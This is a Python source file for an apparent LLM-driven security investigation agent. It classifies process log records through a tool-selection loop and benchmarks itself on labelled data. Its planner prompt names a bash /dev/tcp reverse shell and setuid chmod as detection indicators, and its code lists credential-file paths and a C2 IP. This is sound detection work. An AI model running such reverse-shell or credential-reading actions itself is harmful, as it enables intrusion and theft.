"""
main.py
LogMend 2.0 — TAO (Thought-Action-Observation) loop investigation agent.

Architecture (per LogMend Reference doc)
─────────────────────────────────────────
  LLM Planner (Claude Sonnet via Anthropic API) drives tool selection at each
  cycle.  The planner reasons over accumulated observations and selects the
  next tool with the highest utility (relevance × expected information gain).

TAO cycle mechanics
───────────────────
  Thought  : LLM generates a hypothesis and selects the next tool
  Action   : The selected tool is executed with the standardised identifier
  Observation : Tool result is appended to short-term memory

Stop conditions (ALL enforce the loop to terminate)
───────────────────────────────────────────────────
  1. confidence_malicious ≥ 0.75   (θ_m — MALICIOUS confidence threshold)
  2. confidence_benign    ≥ 0.80   (θ_b — BENIGN confidence threshold)
  3. tool_count ≥ 10               (hard limit — prevents infinite loops)
  4. next_tool == null             (agent declares it has enough evidence)
  5. All 6 tools already used      (no further information available)

Tool deduplication & reprimand
───────────────────────────────
  A set 'used_tools' tracks invoked tools.  If the LLM selects an already-used
  tool, a REPRIMAND message is injected into the conversation and the cycle
  retries WITHOUT incrementing tool_count.  After 3 consecutive reprimands in
  one cycle the loop terminates safely.

Environment
───────────
  Requires ANTHROPIC_API_KEY in the environment (or .env file).
"""

import json
import os
import re
import datetime
import requests

from tools.log_parser         import LogParser
from tools.description_generator import DescriptionGenerator
from tools.rule_matcher       import RuleMatcher
from tools.sequence_scorer    import SequenceScorer
from tools.context_retriever  import ContextRetriever
from tools.ttp_mapper         import TTPMapper
from tools.threat_lookup      import ThreatLookup
from utils.severity_calculator import calculate_severity

# ─────────────────────────────────────────────────────────────────────────────
# CONFIGURATION
# ─────────────────────────────────────────────────────────────────────────────

OLLAMA_MODEL                   = os.getenv("LOGRESP_MODEL", "qwen3.8:27b")
OLLAMA_URL                     = os.getenv("OLLAMA_URL", "http://localhost:11434") + "/api/chat" if not os.getenv("OLLAMA_URL", "").endswith("/api/chat") else os.getenv("OLLAMA_URL")
CONFIDENCE_MALICIOUS_THRESHOLD = 0.75   # θ_m
CONFIDENCE_BENIGN_THRESHOLD    = 0.85   # θ_b  (was 0.95 — too strict, caused over-investigation)
MAX_TOOL_CALLS                 = 10     # hard limit per investigation
MAX_REPRIMANDS_PER_CYCLE       = 3      # safety valve for reprimand loop


# ─────────────────────────────────────────────────────────────────────────────
# TOOL REGISTRY
# Each entry: description (shown to LLM) + invoke callable
# ─────────────────────────────────────────────────────────────────────────────

def _build_registry(tools: dict) -> dict:
    return {
        "DescriptionGenerator": {
            "description": (
                "Converts the log record into a natural language description: "
                "process name, parent process, command line, privileges, and "
                "(for DARPA) network targets with C2 annotation. "
                "Best first tool — primes the hypothesis with human-readable context."
            ),
            "invoke": lambda id_, tag, _obs: (
                tools["DescriptionGenerator"].generate_description(id_, tag)
            ),
        },
        "RuleMatcher": {
            "description": (
                "Scans 12 signature patterns (6 general Linux + 6 DARPA APT-specific: "
                "kernel .ko insmod, ptrace sshd, Firefox→shell chain, sshdlog persistence, "
                "known C2 IPs) against the process. Returns matched_rules[], c2_match bool, "
                "severity_hint 'high'|'low'|'none'."
            ),
            "invoke": lambda id_, tag, _obs: (
                tools["RuleMatcher"].match_rules(id_, tag)
            ),
        },
        "SequenceScorer": {
            "description": (
                "Runs the ML ensemble (BETH: GraphCL 40% + IForest 30% + DeepSAD 30%; "
                "DARPA: MAGIC 40% + Flash 35% + ORTHRUS 25%). Returns anomaly_score [0,1] "
                "and per-model breakdown. Score > 0.65 strongly indicates malicious; "
                "< 0.35 indicates benign."
            ),
            "invoke": lambda id_, tag, _obs: (
                tools["SequenceScorer"].get_anomaly_score(id_, tag)
            ),
        },
        "ContextRetriever": {
            "description": (
                "Queries the Neo4j provenance graph for the process neighbourhood: "
                "parent/child lineage (SPAWNED up to 3 hops), accessed files (ACCESSED), "
                "network connections (CONNECTED_TO), has_c2_connection boolean. "
                "Most useful when anomaly_score > 0.35 — confirms the graph context."
            ),
            "invoke": lambda id_, tag, _obs: (
                tools["ContextRetriever"].get_process_context(id_, tag)
            ),
        },
        "TTPMapper": {
            "description": (
                "Maps process behaviour to MITRE ATT&CK techniques via MiniLM-L12-v2 "
                "sentence embeddings (11 TTPs: 5 Linux general + 6 DARPA APT-specific). "
                "Returns ttp_id, tactic, similarity score. "
                "Best used AFTER DescriptionGenerator has run."
            ),
            "invoke": lambda id_, tag, _obs: (
                tools["TTPMapper"].map_ttp(id_, tag)
            ),
        },
        "ThreatLookup": {
            "description": (
                "Looks up a TTP ID (e.g. T1055) or C2 IP address in the threat "
                "intelligence knowledge base. Returns description, tactic, severity note, "
                "and threat actor attribution (Drakon/Azazel APT). "
                "Should be invoked AFTER TTPMapper or when a C2 IP is identified."
            ),
            "invoke": _make_threat_lookup_invoke(tools),
        },
    }


def _make_threat_lookup_invoke(tools: dict):
    """
    ThreatLookup requires a threat_id.  We extract it from prior observations:
    first from TTPMapper output (ttp_id), then from RuleMatcher (c2_match IP).
    """
    def _invoke(identifier: dict, dataset_tag: str, observations: list) -> str:
        # 1. Try TTPMapper output
        for obs in observations:
            if obs["tool"] == "TTPMapper":
                try:
                    d = json.loads(obs["result"])
                    tid = d.get("ttp_id")
                    if tid:
                        return tools["ThreatLookup"].lookup_threat(tid, dataset_tag)
                except (json.JSONDecodeError, TypeError):
                    pass

        # 2. Try RuleMatcher C2 match
        for obs in observations:
            if obs["tool"] == "RuleMatcher":
                try:
                    d = json.loads(obs["result"])
                    if d.get("c2_match"):
                        # Use the first known C2 IP as lookup key
                        C2_FALLBACK = "35.106.122.76"
                        return tools["ThreatLookup"].lookup_threat(
                            C2_FALLBACK, dataset_tag
                        )
                except (json.JSONDecodeError, TypeError):
                    pass

        # 3. Try identifier ttp_id (may have been injected externally)
        tid = identifier.get("ttp_id_for_lookup")
        if tid:
            return tools["ThreatLookup"].lookup_threat(tid, dataset_tag)

        return json.dumps({
            "status": "error",
            "message": (
                "ThreatLookup requires a TTP ID or C2 IP. "
                "Run TTPMapper or RuleMatcher first."
            )
        })
    return _invoke


# ─────────────────────────────────────────────────────────────────────────────
# LLM PROMPTS
# ─────────────────────────────────────────────────────────────────────────────

PLANNER_SYSTEM = """You are the LogMend 2.0 security investigation agent.
You run a Thought-Action-Observation (TAO) loop to classify log records as
BENIGN, SUSPICIOUS, or MALICIOUS.

At each cycle you will receive:
  - The log record being investigated
  - All prior tool observations
  - The list of tools still available (each tool can be used AT MOST ONCE)

You MUST respond with valid JSON only — no markdown, no preamble, no trailing text:
{
  "thought": "<your current hypothesis and reasoning>",
  "next_tool": "<exact tool name from available_tools, or null to conclude>",
  "confidence_malicious": <float 0.0–1.0>,
  "confidence_benign": <float 0.0–1.0>,
  "reasoning": "<why this tool has highest utility given current evidence>"
}

Confidence rules:
  - confidence_malicious + confidence_benign ≤ 1.0
  - Set next_tool to null when confidence exceeds threshold or no useful tools remain
  - The system will automatically stop when confidence_malicious >= 0.75
    or confidence_benign >= 0.80

Tool selection strategy:
  - BETH records  : DescriptionGenerator → SequenceScorer → RuleMatcher
                    → (if suspicious) TTPMapper → ThreatLookup
  - DARPA records : DescriptionGenerator → SequenceScorer → ContextRetriever
                    → RuleMatcher → TTPMapper → ThreatLookup
  - SequenceScorer is your strongest signal — run it early
  - Only invoke ContextRetriever if anomaly_score > 0.35 (saves tool budget)
  - Only invoke ThreatLookup after TTPMapper has found a TTP ID or RuleMatcher
    found a C2 match

Strong malicious indicators:
  - anomaly_score > 0.65 + rule matches = very high confidence malicious
  - C2 IP match (has_c2_connection) = near-certain malicious for DARPA
  - ptrace on sshd, kernel .ko insmod = DARPA APT kill-chain confirmed
  - Reverse shell (bash -i >& /dev/tcp), chmod 4755 = high BETH confidence

Strong benign indicators:
  - anomaly_score < 0.20 + no rule matches + no sensitive file access
  - Well-known system daemon (systemd, journald) + low event volume
"""

REPORT_SYSTEM = """You are an expert cybersecurity analyst.
Synthesise the investigation observations into a structured report.
Use ONLY the provided evidence — do NOT recalculate severity scores.

Required format (exact headers, no deviation):

### LOGMEND CYBERSECURITY REPORT

**Verdict:** <BENIGN|SUSPICIOUS|MALICIOUS> (Score: X.XX/10.0)

**EXECUTIVE SUMMARY:**
- Process     : <name and PID or UUID>
- Dataset     : <BETH|DARPA>
- Privileges  : <Root | User ID X>
- Matched TTP : <TTP ID and name, or None>

**KEY FINDINGS:**
- [Finding 1: ML ensemble anomaly score and its interpretation]
- [Finding 2: Rule signature matches or graph context summary]
- [Finding 3: Threat intelligence, C2 context, or TTP chain details]

**REASONING TRACE:**
<list each tool invoked and its key observation, one line each>

**RECOMMENDED ACTION:**
- MALICIOUS  → Isolate host, preserve forensics, escalate to IR team
- SUSPICIOUS → Flag for analyst review, increase monitoring
- BENIGN     → No action required; log retained for baseline
(Pick the appropriate single-line recommendation for the actual verdict.)
"""


# ─────────────────────────────────────────────────────────────────────────────
# MAIN AGENT CLASS
# ─────────────────────────────────────────────────────────────────────────────

class LogMendAgent:
    def __init__(self):
        # 1. Bring back the Ollama router!
        from agent.ollama_router import OllamaRouter
        self.llm = OllamaRouter()
        self.parser = LogParser()

        # Instantiate all tools once at agent startup
        _tools = {
            "DescriptionGenerator": DescriptionGenerator(),
            "RuleMatcher":          RuleMatcher(),
            "SequenceScorer":       SequenceScorer(),
            "ContextRetriever":     ContextRetriever(),
            "TTPMapper":            TTPMapper(),
            "ThreatLookup":         ThreatLookup(),
        }
        self.tools    = _tools
        self.registry = _build_registry(_tools)

    # ── public API ─────────────────────────────────────────────────────────

    def run_investigation(self, raw_input) -> dict:
        try:
            # Safely handle the batch runner's custom format
            if isinstance(raw_input, dict) and "identifier" in raw_input and "record" in raw_input:
                record = raw_input["record"]
                identifier = raw_input["identifier"]
                dataset_tag = record.get("datasetTag", "beth")
            else:
                record = self.parser.parse_record(raw_input)
                if not record:
                    return {"status": "error", "message": "Parse failed"}
                    
                dataset_tag = record.get("datasetTag", "beth")
                
                # Fix the NoneType bug by forcing dataset_tag to 'beth' if it says 'beth-flat'
                if "beth" in dataset_tag.lower():
                    dataset_tag = "beth"
                    
                if dataset_tag == "darpa":
                    identifier = {"uuid": record.get("uuid", "unknown")}
                else:
                    identifier = {
                        "pid": record.get("pid", 0),
                        "host_name": record.get("hostName", "unknown"),
                        "process_name": record.get("processName", "unknown"),
                        "parent_pid": record.get("parentPid", 0)
                    }
                
                # Preserve precomputed features from the runner
                if isinstance(raw_input, dict) and "precomputed_features" in raw_input:
                    identifier["precomputed_features"] = raw_input["precomputed_features"]

            print(f"\n{'*' * 75}")
            print(f"[*] LOGMEND TAO INVESTIGATION — {dataset_tag.upper()}")
            if dataset_tag == "darpa":
                print(f"    UUID={identifier.get('uuid')}")
            else:
                print(f"    PID={identifier.get('pid')}  Host={identifier.get('host_name')}  Process={identifier.get('process_name')}")
            print(f"{'*' * 75}")

            return self._run_tao_loop(record, identifier, dataset_tag)

        except Exception as e:
            print(f"  [ERROR] Investigation failed: {e}")
            return {"status": "error"}

    # ── TAO loop ───────────────────────────────────────────────────────────

    def _run_tao_loop(self, record: dict, identifier: dict,
                      dataset_tag: str) -> dict:
        """
        Main TAO loop.  Terminates on:
          - confidence threshold reached
          - next_tool == null from LLM
          - tool_count reaches MAX_TOOL_CALLS
          - all tools exhausted
        """
        used_tools:   set   = set()
        observations: list  = []       # {tool, result, thought}
        conversation: list  = []       # Anthropic messages list
        tool_count:   int   = 0

        # Build the initial investigation prompt
        record_summary     = self._summarize_record(record, identifier)
        available_desc     = self._format_available_tools(used_tools)

        conversation.append({
            "role": "user",
            "content": (
                f"Investigate this {dataset_tag.upper()} log record:\n\n"
                f"{record_summary}\n\n"
                f"Available tools:\n{available_desc}\n\n"
                f"Begin investigation. You MUST select 'SequenceScorer' as your very first tool."
            ),
        })

        # ── TAO loop ─────────────────────────────────────────────────────────
        while tool_count < MAX_TOOL_CALLS and len(used_tools) < len(self.registry):

            # ── THOUGHT: ask LLM to select the next tool ──────────────────────
            llm_response = self._call_planner(conversation)
            plan         = self._parse_plan(llm_response)

            # --- THE BULLETPROOF SAFEGUARD ---
            if not isinstance(plan, dict):
                print("[TAO] LLM returned unparseable response — defaulting to empty.")
                plan = {}

            thought      = plan.get("thought", "LLM failed to generate a thought.")
            next_tool    = plan.get("next_tool")
            
            # Safely parse floats to avoid TypeError if LLM returns null
            try:
                conf_mal = float(plan.get("confidence_malicious") or 0.0)
            except (ValueError, TypeError):
                conf_mal = 0.0
                
            try:
                conf_ben = float(plan.get("confidence_benign") or 0.0)
            except (ValueError, TypeError):
                conf_ben = 0.0

            print(f"\n{'─' * 60}")
            print(f"[TAO Cycle {tool_count + 1} / {MAX_TOOL_CALLS}]")
            print(f"  Thought   : {thought[:120]}...")
            print(f"  Next tool : {next_tool}")
            print(f"  Confidence: malicious={conf_mal:.2f}  benign={conf_ben:.2f}")

            # Record the assistant's plan in conversation
            conversation.append({"role": "assistant", "content": llm_response})

            # ── Stop condition 1 & 2: confidence thresholds ───────────────────
            if conf_mal >= CONFIDENCE_MALICIOUS_THRESHOLD:
                print(f"  [STOP] confidence_malicious {conf_mal:.2f} >= "
                      f"{CONFIDENCE_MALICIOUS_THRESHOLD} → terminating")
                break

            if conf_ben >= CONFIDENCE_BENIGN_THRESHOLD:
                print(f"  [STOP] confidence_benign {conf_ben:.2f} >= "
                      f"{CONFIDENCE_BENIGN_THRESHOLD} → terminating")
                break

            # ── Stop condition 4: agent declares conclusion ────────────────────
            if next_tool is None:
                print("  [STOP] Agent set next_tool=null — sufficient evidence collected.")
                break

            # ── Tool deduplication — reprimand if already used ─────────────────
            reprimand_count = 0
            while next_tool in used_tools:
                reprimand_count += 1
                remaining = [t for t in self.registry if t not in used_tools]

                print(f"  [REPRIMAND #{reprimand_count}] "
                      f"LLM attempted to reuse '{next_tool}'")

                reprimand_msg = (
                    f"[SYSTEM REPRIMAND] You selected '{next_tool}' but it has "
                    f"already been used in this investigation. Each tool may only "
                    f"be invoked ONCE. "
                    f"Remaining available tools: {remaining}. "
                    f"Respond with a corrected JSON selecting a different tool "
                    f"(or null to conclude)."
                )
                conversation.append({"role": "user",    "content": reprimand_msg})
                llm_response  = self._call_planner(conversation)
                plan          = self._parse_plan(llm_response)
                
                # --- THE BULLETPROOF SAFEGUARD (Inside Reprimand) ---
                if not isinstance(plan, dict):
                    plan = {}
                    
                conversation.append({"role": "assistant", "content": llm_response})
                next_tool = plan.get("next_tool")

                # Safety: too many reprimands — break the inner loop
                if reprimand_count >= MAX_REPRIMANDS_PER_CYCLE:
                    print(f"  [STOP] Max reprimands ({MAX_REPRIMANDS_PER_CYCLE}) "
                          f"reached — terminating investigation.")
                    next_tool = None
                    break

            # After reprimand loop, re-check null
            if next_tool is None:
                break

            # ── Validate tool name ────────────────────────────────────────────
            if next_tool not in self.registry:
                print(f"  [WARN] LLM selected unknown tool '{next_tool}' — skipping.")
                valid_tools = [t for t in self.registry if t not in used_tools]
                conversation.append({
                    "role": "user",
                    "content": (
                        f"[ERROR] '{next_tool}' is not a valid tool name. "
                        f"Valid remaining tools: {valid_tools}. "
                        f"Select a valid tool or null."
                    ),
                })
                continue

            # ── ACTION: execute the selected tool ─────────────────────────────
            print(f"  [ACTION] Executing {next_tool}...")
            try:
                result_json = self.registry[next_tool]["invoke"](
                    identifier, dataset_tag, observations
                )
            except Exception as exc:
                result_json = json.dumps({
                    "status": "error", "message": str(exc)
                })
                print(f"  [ERROR] Tool {next_tool} raised: {exc}")

            used_tools.add(next_tool)
            tool_count += 1

            # ── OBSERVATION: record result ────────────────────────────────────
            thought_from_plan = plan.get("thought", "") if isinstance(plan, dict) else ""
            observations.append({
                "tool":    next_tool,
                "result":  result_json,
                "thought": thought_from_plan,
            })

            obs_summary = self._summarize_result(next_tool, result_json)
            remaining   = [t for t in self.registry if t not in used_tools]

            conversation.append({
                "role": "user",
                "content": (
                    f"Observation from {next_tool} "
                    f"(tool {tool_count}/{MAX_TOOL_CALLS}):\n\n"
                    f"{obs_summary}\n\n"
                    f"Tools used: {sorted(used_tools)}\n"
                    f"Tools remaining: {remaining}\n\n"
                    f"Continue investigation or set next_tool to null."
                ),
            })

        # ── Stop condition 3 / 5: loop exited ────────────────────────────────
        if tool_count >= MAX_TOOL_CALLS:
            print(f"\n[TAO] Hard limit of {MAX_TOOL_CALLS} tool calls reached.")
        elif len(used_tools) >= len(self.registry):
            print("\n[TAO] All tools exhausted.")

        print(f"\n[TAO] Investigation complete. "
              f"{tool_count} tool(s) invoked: {sorted(used_tools)}")

        # ── Build severity metrics from observations ────────────────────────
        anomaly_score, features, severity_ctx = (
            self._extract_severity_inputs(observations)
        )
        severity_metrics = calculate_severity(
            anomaly_score, features, dataset_tag, severity_ctx,
            process_name=record.get("processName", ""),
        )

        # ── Generate final structured report ─────────────────────────────────
        report = self._generate_final_report(
            record, dataset_tag, observations, severity_metrics
        )

        # ── Print and return ──────────────────────────────────────────────────
        self._print_summary(dataset_tag, severity_metrics, tool_count)

        return {
            "dataset":          dataset_tag,
            "identifier":       identifier,
            "anomaly_score":    anomaly_score,
            "severity_metrics": severity_metrics,
            "tools_used":       sorted(used_tools),
            "tool_count":       tool_count,
            "report":           report,
            "reasoning_trace":  [
                {"tool": o["tool"], "thought": o["thought"][:80]}
                for o in observations
            ],
        }

    # ── LLM call helpers ───────────────────────────────────────────────────

    def _call_planner(self, conversation: list) -> str:
        """Uses your OllamaRouter to make the planning call."""
        # Convert the conversation history into a single prompt for Ollama
        user_prompt = ""
        for msg in conversation:
            role = msg.get("role", "user").upper()
            content = msg.get("content", "")
            user_prompt += f"[{role}]\n{content}\n\n"
            
        try:
            # Route through your OllamaRouter with require_json=True
            response = self.llm.generate_response(PLANNER_SYSTEM, user_prompt, require_json=True)
            
            # The bulletproof safeguard
            if not response or response.lower() == "null":
                return "{}"
            return response
            
        except Exception as exc:
            print(f"[LLM ERROR] Planner call failed: {exc}")
            return "{}"

    def _call_reporter(self, prompt: str) -> str:
        """Uses your OllamaRouter to make the final report call."""
        try:
            response = self.llm.generate_response(REPORT_SYSTEM, prompt, require_json=False)
            
            if not response or response.lower() == "null":
                return "Report generation failed."
            return response
            
        except Exception as exc:
            print(f"[LLM ERROR] Reporter call failed: {exc}")
            return "Report generation failed."

    @staticmethod
    def _parse_plan(raw: str) -> dict | None:
        """
        Parse LLM planner JSON response robustly.
        Strips markdown fences if present, falls back to regex extraction.
        """
        if not raw:
            return None
        # Strip ```json ... ``` fences
        cleaned = re.sub(r"```(?:json)?\s*", "", raw).strip().rstrip("`").strip()
        try:
            return json.loads(cleaned)
        except json.JSONDecodeError:
            # Last resort: find first { ... } block
            m = re.search(r"\{.*\}", cleaned, re.DOTALL)
            if m:
                try:
                    return json.loads(m.group(0))
                except json.JSONDecodeError:
                    pass
        return None

    # ── Evidence helpers ───────────────────────────────────────────────────

    @staticmethod
    def _summarize_record(record: dict, identifier: dict) -> str:
        """Compact human-readable record summary for the initial LLM prompt."""
        tag = record.get("datasetTag", "unknown").upper()
        if record.get("datasetTag") == "beth":
            return (
                f"Dataset     : {tag}\n"
                f"Process     : {record.get('processName', '?')} "
                f"(PID={record.get('pid', '?')})\n"
                f"Host        : {record.get('hostName', '?')}\n"
                f"Parent PID  : {record.get('parentPid', '?')}\n"
                f"User ID     : {record.get('userId', '?')} "
                f"({'ROOT' if str(record.get('userId','?')) == '0' else 'non-root'})\n"
                f"Command     : {record.get('cmdLine', '(none)')[:120]}\n"
                f"sus flag    : {record.get('sus', 0)}\n"
                f"evil flag   : {record.get('evil', 0)}\n"
                f"event_count : {identifier.get('precomputed_features', {}).get('event_count', 'N/A')}"
            )
        else:
            return (
                f"Dataset     : {tag}\n"
                f"Process     : {record.get('processName', '?')}\n"
                f"UUID        : {record.get('uuid', '?')}\n"
                f"Parent PID  : {record.get('parentPid', '?')}\n"
                f"User ID     : {record.get('userId', '?')}\n"
                f"Command     : {record.get('cmdLine', '(none)')[:120]}"
            )

    def _format_available_tools(self, used_tools: set) -> str:
        """Bullet list of unused tools with descriptions."""
        lines = []
        for name, info in self.registry.items():
            if name not in used_tools:
                lines.append(f"  • {name}: {info['description']}")
        return "\n".join(lines) if lines else "  (none remaining)"

    @staticmethod
    def _summarize_result(tool_name: str, result_json: str) -> str:
        """
        Compact one-paragraph summary of a tool result for the observation
        message fed back into the LLM conversation.
        """
        try:
            d = json.loads(result_json)
        except (json.JSONDecodeError, TypeError):
            return f"Raw output: {result_json[:300]}"

        if d.get("status") == "error":
            return f"Status: ERROR — {d.get('message', 'unknown error')}"

        if tool_name == "DescriptionGenerator":
            return f"Description: {d.get('result', 'N/A')}"

        if tool_name == "RuleMatcher":
            rules   = d.get("matched_rules", [])
            c2      = d.get("c2_match", False)
            hint    = d.get("severity_hint", "none")
            matched = ", ".join(rules) if rules else "None"
            return (
                f"Matched rules   : {matched}\n"
                f"C2 IP match     : {c2}\n"
                f"Severity hint   : {hint}"
            )

        if tool_name == "SequenceScorer":
            score  = d.get("anomaly_score", "?")
            ens    = d.get("dataset_ensemble", "?")
            models = d.get("model_scores", {})
            feats  = d.get("features_extracted", {})
            return (
                f"Anomaly score   : {score}  (ensemble={ens})\n"
                f"Model scores    : {json.dumps(models)}\n"
                f"Features        : is_root={feats.get('is_root')} "
                f"event_count={feats.get('event_count')} "
                f"sus_ratio={feats.get('sus_ratio')} "
                f"evil_ratio={feats.get('evil_ratio')} "
                f"net_ratio={feats.get('net_ratio')} "
                f"c2_count={feats.get('c2_event_count')} "
                f"file_writes={feats.get('file_write_count')}"
            )

        if tool_name == "ContextRetriever":
            res  = d.get("result", {})
            c2   = res.get("HasC2Connection", False)
            nets = res.get("NetworkConnections", [])
            priv = res.get("Privileges", "?")
            kids = res.get("SpawnedChildren", [])
            return (
                f"Privileges      : {priv}\n"
                f"Spawned children: {kids[:5]}\n"
                f"Network conns   : {nets[:5]}\n"
                f"C2 connection   : {c2}"
            )

        if tool_name == "TTPMapper":
            tid  = d.get("ttp_id")
            name = d.get("result", "No match")
            sim  = d.get("similarity", 0.0)
            kc   = d.get("kill_chain_stage", 1)
            return (
                f"TTP ID          : {tid or 'None'}\n"
                f"Match           : {name}\n"
                f"Similarity      : {sim}\n"
                f"Kill chain stage: {kc}"
            )

        if tool_name == "ThreatLookup":
            return (
                f"Name            : {d.get('name', '?')}\n"
                f"Tactic          : {d.get('tactic', '?')}\n"
                f"Description     : {str(d.get('result', ''))[:200]}\n"
                f"Severity note   : {d.get('severity_note', '?')}\n"
                f"Threat actor    : {d.get('threat_actor', 'N/A')}"
            )

        # Fallback: compact JSON dump
        return json.dumps(d, indent=2)[:400]

    # ── Severity helpers ───────────────────────────────────────────────────

    @staticmethod
    def _extract_severity_inputs(observations: list) -> tuple[float, dict, dict]:
        """
        Scan all tool observations to build the three inputs for
        calculate_severity():
          - anomaly_score  (float)
          - features dict  (from SequenceScorer)
          - context dict   (from RuleMatcher + ContextRetriever + TTPMapper)
        """
        anomaly_score = 0.0
        features      = {}
        ctx = {
            "rules_matched":     False,
            "c2_match":          False,
            "sensitive_paths":   False,
            "has_c2_connection": False,
            "ttp_id":            None,
            "ttp_impact":        1,
            "kill_chain_stage":  1,
        }

        for obs in observations:
            tool   = obs["tool"]
            result = obs["result"]
            try:
                d = json.loads(result)
            except (json.JSONDecodeError, TypeError):
                continue
            if d.get("status") != "success":
                continue

            if tool == "SequenceScorer":
                anomaly_score = float(d.get("anomaly_score", 0.0))
                features      = d.get("features_extracted", {})

            elif tool == "RuleMatcher":
                ctx["rules_matched"] = bool(d.get("matched_rules"))
                ctx["c2_match"]      = bool(d.get("c2_match", False))

            elif tool == "ContextRetriever":
                res   = d.get("result", {})
                files = res.get("FilesAccessed") or []
                ctx["sensitive_paths"] = any(
                    kw in str(f)
                    for f in files
                    for kw in ("/etc/shadow", "/etc/passwd", ".ssh/", "/proc/")
                )
                ctx["has_c2_connection"] = bool(res.get("HasC2Connection", False))

            elif tool == "TTPMapper":
                if d.get("ttp_id"):
                    ctx["ttp_id"]           = d["ttp_id"]
                    ctx["ttp_impact"]       = int(d.get("ttp_impact", 1))
                    ctx["kill_chain_stage"] = int(d.get("kill_chain_stage", 1))

        # P2: Pass evil_ratio from features so severity calibration logic works
        ctx["evil_ratio"] = float(features.get("evil_ratio", 0.0))

        # P2: Detect if all graph-dependent tools failed (test data not in Neo4j)
        graph_tools = {"ContextRetriever", "DescriptionGenerator", "TTPMapper"}
        graph_statuses = []
        for obs in observations:
            if obs["tool"] in graph_tools:
                try:
                    d = json.loads(obs["result"])
                    graph_statuses.append(d.get("status") == "success")
                except (json.JSONDecodeError, TypeError):
                    graph_statuses.append(False)
        ctx["graph_tools_all_failed"] = (
            len(graph_statuses) > 0 and not any(graph_statuses)
        )

        return anomaly_score, features, ctx

    # ── Final report ───────────────────────────────────────────────────────

    def _generate_final_report(self, record: dict, dataset_tag: str,
                                observations: list,
                                severity_metrics: dict) -> str:
        """One LLM call to synthesise all observations into the final report."""
        tier     = severity_metrics["tier"]
        severity = severity_metrics["final_severity"]

        evidence_block = "\n\n".join(
            f"[{obs['tool']}]\n{self._summarize_result(obs['tool'], obs['result'])}"
            for obs in observations
        )

        prompt = (
            f"The mathematical severity metrics are already calculated:\n"
            f"{json.dumps(severity_metrics, indent=2)}\n\n"
            f"The verdict MUST be declared as: {tier} (Score: {severity}/10.0)\n\n"
            f"Log record:\n{self._summarize_record(record, {})}\n\n"
            f"Tool observations:\n{evidence_block}"
        )
        return self._call_reporter(prompt)

    @staticmethod
    def _print_summary(dataset_tag: str, metrics: dict, tool_count: int) -> None:
        tier = metrics["tier"]
        sev  = metrics["final_severity"]
        print(f"\n{'=' * 65}")
        print(f"  LOGMEND {dataset_tag.upper()}  |  {tier}  |  Score: {sev}/10.0  "
              f"|  {tool_count} tool(s) invoked")
        print(f"{'=' * 65}")

    # ── Identifier builder ─────────────────────────────────────────────────

    @staticmethod
    def _build_identifier(record: dict) -> dict:
        """
        Build the identifier dict consumed by all tools.
        For BETH: pid, host_name, process_name, parent_pid.
        For DARPA: uuid.
        Passes through precomputed_features if present (set by json_file_runner).
        """
        if record["datasetTag"] == "darpa":
            return {
                "uuid":                record.get("uuid"),
                "precomputed_features": record.get("precomputed_features"),
            }
        return {
            "pid":                  record.get("pid"),
            "host_name":            record.get("hostName"),
            "process_name":         record.get("processName"),
            "parent_pid":           record.get("parentPid"),
            "cmd_line":             record.get("cmdLine", ""),
            "precomputed_features": record.get("precomputed_features"),
        }


# ─────────────────────────────────────────────────────────────────────────────
# BENCHMARK / EVALUATION (Neo4j-based — training graph only)
# ─────────────────────────────────────────────────────────────────────────────

def run_benchmark():
    """
    Pull labelled records from the Neo4j training graph and run the agent
    on each.  Only use this for the TRAINING split (the data is in Neo4j).
    For test/val JSON files, use json_file_runner.py instead.
    """
    import random
    import time
    from database.neo4j_router import db_router

    try:
        limit = int(input("Records per class (e.g. 20): "))
    except ValueError:
        limit = 5

    beth_mal = db_router.query("beth", """
        MATCH (p:Process)
        OPTIONAL MATCH (p)-[:EMITS]->(e)
        WITH p, coalesce(sum(e.evil), 0) AS evil_score
        WHERE evil_score > 0
        RETURN DISTINCT p.processId AS pid, p.hostName AS host,
               p.processName AS name, p.parentProcessId AS ppid, 1 AS label
        LIMIT $lim
    """, {"lim": limit}) or []

    beth_ben = db_router.query("beth", """
        MATCH (p:Process)
        OPTIONAL MATCH (p)-[:EMITS]->(e)
        WITH p, coalesce(sum(e.evil), 0) AS evil_score
        WHERE evil_score = 0
        RETURN DISTINCT p.processId AS pid, p.hostName AS host,
               p.processName AS name, p.parentProcessId AS ppid, 0 AS label
        LIMIT $lim
    """, {"lim": limit}) or []

    darpa_mal = db_router.query("darpa", """
        MATCH (p:Process) WHERE p.is_evil = 1 OR p.evil = 1
        RETURN p.uuid AS uuid, 1 AS label LIMIT $lim
    """, {"lim": limit}) or []

    darpa_ben = db_router.query("darpa", """
        MATCH (p:Process) WHERE NOT (p.is_evil = 1 OR p.evil = 1)
        RETURN p.uuid AS uuid, 0 AS label LIMIT $lim
    """, {"lim": limit}) or []

    agent   = LogMendAgent()
    dataset = []

    for r in beth_mal + beth_ben:
        dataset.append({
            "raw": json.dumps({
                "processId": r["pid"], "hostName": r["host"],
                "processName": r["name"], "parentProcessId": r["ppid"],
            }),
            "label": r["label"],
        })
    for r in darpa_mal + darpa_ben:
        dataset.append({
            "raw": json.dumps({"uuid": r["uuid"]}),
            "label": r["label"],
        })

    random.seed(42)
    random.shuffle(dataset)
    total = len(dataset)

    print(f"\n[Benchmark] {total} records  "
          f"({len(beth_mal)+len(beth_ben)} BETH,  "
          f"{len(darpa_mal)+len(darpa_ben)} DARPA)\n")

    tp = tn = fp = fn = 0
    start = time.time()

    for idx, item in enumerate(dataset):
        label = item["label"]
        print(f"\n{'=' * 60}")
        print(f"  [{idx+1}/{total}]  Ground truth: "
              f"{'Malicious' if label else 'Benign'}")
        print(f"{'=' * 60}")

        result   = agent.run_investigation(item["raw"])
        severity = result.get("severity_metrics", {}).get("final_severity", 0.0)
        pred     = 1 if severity >= 3.5 else 0   # SUSPICIOUS or higher → positive

        if   label == 1 and pred == 1: tp += 1
        elif label == 0 and pred == 0: tn += 1
        elif label == 0 and pred == 1: fp += 1
        else:                          fn += 1

    elapsed   = time.time() - start
    accuracy  = (tp + tn) / total         if total             > 0 else 0
    precision = tp / (tp + fp)            if (tp + fp)         > 0 else 0
    recall    = tp / (tp + fn)            if (tp + fn)         > 0 else 0
    f1        = (2 * precision * recall / (precision + recall)
                 if (precision + recall) > 0 else 0)

    print("\n" + "=" * 55)
    print("  LOGMEND EVALUATION RESULTS")
    print("=" * 55)
    print(f"  Total     : {total}   Time: {elapsed:.1f}s")
    print(f"  TP={tp}  TN={tn}  FP={fp}  FN={fn}")
    print(f"  Accuracy  : {accuracy * 100:.2f}%")
